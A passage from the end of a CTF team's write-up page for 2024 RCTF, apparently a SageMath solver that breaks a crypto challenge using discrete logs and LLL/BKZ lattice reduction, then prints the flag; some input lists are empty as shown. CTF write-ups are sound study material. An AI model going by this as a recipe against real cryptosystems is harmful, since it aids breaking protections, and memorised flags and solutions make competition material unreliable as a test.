class="number">0x1795712A13E07F7CCA7A0B09B33EE746414E48863BD7EE1BD0D883460828FE88516774E44AC3F0CE5DA045688C40844677DA6D38582AC7CF2C00E8724AD399059E9298BB1AD9834DAA0481765FFBB00FCA71BAD1E024F7193334D71755B0EEA1D1C761E11FB67C3B495F8D12720A59A8AAEC3F8A59BD6BC45C8C236A29B74CBE823BF9A816556F6DD79364A3E87B02028F9B35C5BC46EE597ABDC1A465B9F41353DD514AA5B91326EB4868BA1C3BC8B74F55DBEF6E59BCF896E15C8400CA6B695C368EF87CBD99FDD4D33F5889EE36A571240B16FFD76C0FAEB81E4550B8549193E88CF630D2422903D1AA08CA369FE0E79DD04F581B7DD8CB1D3F28F9EE2583B</span></span><br><span class="line">G = GF(p)</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow, token_bytes</span><br><span class="line">Ls = </span><br><span class="line">gs = </span><br><span class="line">g = <span class="number">45271426195437984198148734130819758602633909815689072697478701620601435374673859115374977739381723399290678384412185045217122060295726959080235531506689431253052329409248991162086755435524236239059164372248760776929823125679997728474984060374726551469255675878559640618558013763390399453799698222302893713694848361621145466743475696742422956752275573833137869181667151612124053978279138459573664900264490229603163834249353694326197102808037601830972670908019774394079149810806591598567334118064953523756408265128194654597075018359473812617392872386329084774129433549345609748777264532420011155288544759753547510177100</span></span><br><span class="line">afs = [discrete_log(G(gi),G(g)) <span class="keyword">for</span> gi <span class="keyword">in</span> gs]</span><br><span class="line">hs = [discrete_log(G(li),G(g)) <span class="keyword">for</span> li <span class="keyword">in</span> Ls]</span><br><span class="line">M = Matrix(ZZ,<span class="number">74</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">    M[i,-<span class="number">1</span>] = afs[i]</span><br><span class="line">    M[i,-<span class="number">2</span>] = hs[i]</span><br><span class="line">    M[i,i] = <span class="number">1</span></span><br><span class="line">    M[-<span class="number">1</span>,-<span class="number">1</span>] = p-<span class="number">1</span></span><br><span class="line">    M[-<span class="number">2</span>,-<span class="number">2</span>] = p-<span class="number">1</span></span><br><span class="line">M.rescale_col(<span class="number">72</span>,<span class="number">2</span>^<span class="number">1000</span>)</span><br><span class="line">M.rescale_col(<span class="number">73</span>,<span class="number">2</span>^<span class="number">1000</span>)</span><br><span class="line">res = M.LLL()</span><br><span class="line">ortm = res[:-<span class="number">2</span>,:-<span class="number">2</span>]</span><br><span class="line">ortm = ortm[:-<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 测试发现后三组不满足与es正交所以去除</span></span><br><span class="line">es = ortm.right_kernel_matrix().BKZ()</span><br><span class="line">v1 = -es[<span class="number">1</span>]</span><br><span class="line">v2 = es[<span class="number">0</span>] - es[<span class="number">1</span>]</span><br><span class="line">v0 = es[<span class="number">2</span>]</span><br><span class="line">M = Matrix(ZZ,<span class="number">75</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">    M[i,-<span class="number">1</span>] = v0[i]</span><br><span class="line">    M[i,-<span class="number">2</span>] = v1[i]</span><br><span class="line">    M[i,-<span class="number">3</span>] = v2[i]</span><br><span class="line">    M[i,i] = <span class="number">1</span></span><br><span class="line">M[-<span class="number">1</span>,-<span class="number">1</span>] = p-<span class="number">1</span></span><br><span class="line">M[-<span class="number">2</span>,-<span class="number">2</span>] = p-<span class="number">1</span></span><br><span class="line">M[-<span class="number">3</span>,-<span class="number">3</span>] = p-<span class="number">1</span></span><br><span class="line">M.rescale_col(<span class="number">72</span>,<span class="number">2</span>^<span class="number">1000</span>)</span><br><span class="line">M.rescale_col(<span class="number">73</span>,<span class="number">2</span>^<span class="number">1000</span>)</span><br><span class="line">M.rescale_col(<span class="number">74</span>,<span class="number">2</span>^<span class="number">1000</span>)</span><br><span class="line">res = M.LLL()</span><br><span class="line">(<span class="built_in">sum</span>([i*j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(afs,res[<span class="number">2</span>])])*otp+<span class="built_in">sum</span>([i*j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(hs,res[<span class="number">2</span>])]))%(p-<span class="number">1</span>)</span><br><span class="line">otp = (-<span class="built_in">sum</span>([i*j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(hs,res[<span class="number">2</span>])]))*inverse_mod(<span class="built_in">sum</span>([i*j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(afs,res[<span class="number">2</span>])]),p-<span class="number">1</span>)%(p-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># otp = 128014576779010347641276589457573367112401478547684141654683946467594935856339983682465033576749697579626748196826109013977343102747578712429921277421560812163785175294082899</span></span><br><span class="line">otp = long_to_bytes(otp)</span><br><span class="line">v1 = -es[<span class="number">1</span>]</span><br><span class="line">v2 = es[<span class="number">0</span>] - es[<span class="number">1</span>]</span><br><span class="line">v0 = es[<span class="number">2</span>]</span><br><span class="line">v0[<span class="number">0</span>],v1[<span class="number">0</span>],v2[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">256</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">256</span>,<span class="number">256</span>):</span><br><span class="line">        ee1 = v0 + i*v1 + j*v2</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(long_to_bytes(<span class="built_in">abs</span>(ee1[<span class="number">0</span>]))[<span class="number">32</span>]^^otp[i]) == <span class="string">b&#x27;R&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(long_to_bytes(<span class="built_in">abs</span>(ee1[<span class="number">1</span>]))[<span class="number">32</span>]^^otp[i]) == <span class="string">b&#x27;C&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">chr</span>(long_to_bytes(<span class="built_in">abs</span>(ee1[<span class="number">1</span>]))[<span class="number">32</span>]^^otp[i]) == <span class="string">b&#x27;T&#x27;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(i,j)</span><br><span class="line">                        <span class="comment"># -127 , -101</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ee1 = v0 + -<span class="number">127</span>*v1 + -<span class="number">101</span> * v2</span><br><span class="line">ee1 = -ee1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">72</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(long_to_bytes(ee1[i])[<span class="number">32</span>]^^otp[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># RCTF&#123;___good_basis___bad_basis___How_about_my_1_byte_imbalance_basis___&#125;</span></span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>2024 RCTF SU WriteUp</p><p><a href="https://team-su.github.io/posts/28185.html">https://team-su.github.io/posts/28185.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2024-05-27</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/RCTF/">RCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/50834.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2024 熊猫杯决赛 SU WriteUp</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/21240.html"><span class="level-item">2023 ACTF SU WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>